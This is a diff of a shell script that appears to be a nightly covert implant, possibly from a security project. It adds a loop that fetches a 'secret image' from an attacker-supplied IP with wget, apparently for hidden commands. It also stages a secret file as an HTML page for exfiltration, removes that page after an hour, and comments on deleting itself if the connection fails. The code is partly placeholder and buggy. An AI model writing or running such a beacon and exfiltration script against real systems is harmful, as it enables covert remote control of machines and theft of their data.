@@ -4,13 +4,13 @@
 This is the script that is downloaded + run every night
 W/out cron version
 """
-current=$(date +%s)
-#Pull image down from site
-command_image="secretImage.png"
-wget -nd -r $command_image -A jpeg,jpg,bmp,gif,png http://127.0.0.1:8000/
-
-while true:
+ip_addr=$1
+while true
 do
+    current=$(date +%s)
+    #Pull image down from site
+    command_image="secretImage.png"
+    wget -nd -r $command_image -A jpeg,jpg,bmp,gif,png http://$ip_addr:8000/
     #check if there is an image, if not assume connection is broken and delete self
     if [[ 100 < 1 ]]; then
         echo "image hasn't been uploaded"
@@ -65,13 +65,21 @@ do
     #Need to know where vulnerable data is
     secret_file="secret_file.txt"
 
+    #post secret data to website
     touch "secretData.html"
     cat $secret_file > "secretData.html"
 
+    #sleep for 1 hour
+    sleep 3600
+    rm secretData.html
+
     #Sleep until next night
     current=$(date +%s)
-    target=$(date -j '1:00' +%s)
-    sleep_seconds=$(( $target_epoch - $current_epoch ))
-    sleep $sleep_seconds
+    echo "current: $current"
+    target=$(date -d 'tomorrow 1:30' +%s)
+    sleep_seconds=$(( $target - $current ))
+    echo "sleep $sleep_seconds"
+
+    sleep 15
 
 done
